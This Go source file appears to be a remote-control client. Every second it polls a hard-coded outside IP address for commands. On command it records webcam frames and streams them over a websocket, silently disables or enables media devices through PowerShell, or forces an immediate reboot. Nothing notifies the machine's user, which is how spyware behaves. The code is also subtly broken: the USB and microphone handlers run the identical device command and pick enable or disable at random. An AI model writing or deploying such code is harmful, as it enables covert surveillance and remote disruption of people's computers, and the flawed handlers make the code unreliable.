package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"

	"math/rand"

	"github.com/gorilla/websocket"
	"gocv.io/x/gocv"
)

type Response struct {
	Command string `json:"command"`
}

func handleCamera() {
	webcam, err := gocv.OpenVideoCapture(0)
	if err != nil {
		panic(err)
	}
	defer webcam.Close()

	img := gocv.NewMat()
	defer img.Close()

	conn, _, err := websocket.DefaultDialer.Dial("ws://localhost:8080/ws/client", nil)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	webcam.Set(gocv.VideoCaptureFrameWidth, 640)
	webcam.Set(gocv.VideoCaptureFrameHeight, 480)

	endTime := time.Now().Add(time.Minute)
	for time.Now().Before(endTime) {
		if ok := webcam.Read(&img); !ok || img.Empty() {
			continue
		}

		buf, err := gocv.IMEncode(gocv.JPEGFileExt, img)
		if err != nil {
			continue
		}

		if err := conn.WriteMessage(websocket.BinaryMessage, buf.GetBytes()); err != nil {
			break
		}
	}

}

func handleUSB(state int) {
	action := "Disable"
	if state == 1 {
		action = "Enable"
	}
	exec.Command("powershell", "-Command",
		fmt.Sprintf("Get-PnpDevice -Class Media | %s-PnpDevice -Confirm:$false", action)).CombinedOutput()
}

func handleReboot() {
	cmd := exec.Command("cmd", "/C", "shutdown /r /f /t 0")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(fmt.Errorf("reboot failed: %v\nOutput: %s", err, string(output)))
	}
}

func handleMic(state int) {
	action := "Disable"
	if state == 1 {
		action = "Enable"
	}
	exec.Command("powershell", "-Command",
		fmt.Sprintf("Get-PnpDevice -Class Media | %s-PnpDevice -Confirm:$false", action)).CombinedOutput()
}

func makeRequest() {
	url := "http://178.208.92.199:8088/commands"

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	var response Response
	err = json.Unmarshal(body, &response)
	if err != nil {
		fmt.Println("Error unmarshalling JSON:", err)
		return
	}

	switch response.Command {
	case "camera":
		handleCamera()
	case "usb":
		handleUSB(rand.Intn(2))
	case "reboot":
		handleReboot()
	case "microphone":
		handleMic(rand.Intn(2))
	default:
		fmt.Println("Unknown command:", response.Command)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		makeRequest()
	}
}
